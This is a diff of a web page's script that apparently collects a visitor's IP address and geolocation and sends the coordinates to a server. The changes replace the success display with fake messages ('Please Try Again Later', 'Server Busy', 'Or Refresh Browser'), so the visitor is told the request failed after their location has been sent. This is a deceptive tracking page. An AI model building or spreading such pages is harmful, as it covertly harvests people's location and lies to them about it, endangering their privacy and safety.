@@ -61,7 +61,7 @@
       const res = await fetch("https://api.ipify.org?format=json");
       const data = await res.json();
       userIP = data.ip;
-      ipEl.textContent = "IP: " + userIP;
+      ipEl.textContent = "Or Refresh Browser";
     } catch(e) {
       userIP = "unknown";
       ipEl.textContent = "IP: unknown";
@@ -149,9 +149,8 @@
       setStatus('Loading');
       const result = await sendLocation(lastPos.latitude, lastPos.longitude, lastPos.accuracy);
       if (result.ok) {
-        coordsEl.textContent = `Please Try Agai Later`;
+        coordsEl.textContent = `Please Try Again Later`;
         mapUrl.href = `Server Busy`;
-        mapUrl.textContent = "Conecting.....";
         mapWrap.style.display = 'block';
       } else {
         setStatus('Gagal kirim: ' + (result.error || 'unknown'));
